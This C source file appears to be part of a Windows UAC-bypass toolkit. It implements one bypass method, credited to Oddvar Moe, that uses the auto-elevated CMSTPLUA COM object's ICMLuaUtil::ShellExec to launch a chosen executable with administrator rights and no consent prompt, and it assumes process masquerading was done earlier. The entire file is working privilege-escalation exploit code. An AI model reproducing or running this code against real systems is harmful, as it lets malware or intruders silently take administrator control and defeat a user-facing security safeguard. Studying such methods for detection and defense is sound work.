/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2022
*
*  TITLE:       API0CRADLE.C
*
*  VERSION:     3.61
*
*  DATE:        22 Jun 2022
*
*  UAC bypass method from Oddvar Moe aka api0cradle.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmCMLuaUtilShellExecMethod
*
* Purpose:
*
* Bypass UAC using AutoElevated undocumented CMLuaUtil interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
*/
NTSTATUS ucmCMLuaUtilShellExecMethod(
    _In_ LPWSTR lpszExecutable
)
{
    NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
    HRESULT     r, hr_init;
    ICMLuaUtil* CMLuaUtil = NULL;

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    ucmConsolePrintText(TEXT("[41] target executable"), lpszExecutable);
    ucmConsolePrintStatus(TEXT("[41] CoInitializeEx"), hr_init);

    do {

        r = ucmAllocateElevatedObject(
            T_CLSID_CMSTPLUA,
            &IID_ICMLuaUtil,
            CLSCTX_LOCAL_SERVER,
            (void**)&CMLuaUtil);

        ucmConsolePrintStatus(TEXT("[41] CoGetObject(Elevation:Administrator!new:CMSTPLUA)"), r);

        if (r != S_OK)
            break;

        if (CMLuaUtil == NULL) {
            ucmConsolePrint(TEXT("[41] CMLuaUtil is NULL\r\n"));
            break;
        }

        ucmConsolePrint(TEXT("[41] elevated object acquired, calling ShellExec\r\n"));

        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
            lpszExecutable,
            NULL,
            NULL,
            SEE_MASK_DEFAULT,
            SW_SHOW);

        ucmConsolePrintStatus(TEXT("[41] ICMLuaUtil::ShellExec"), r);

        if (SUCCEEDED(r))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }

    if (hr_init == S_OK)
        CoUninitialize();

    ucmConsolePrintStatus(TEXT("[41] MethodResult"), MethodResult);

    return MethodResult;
}
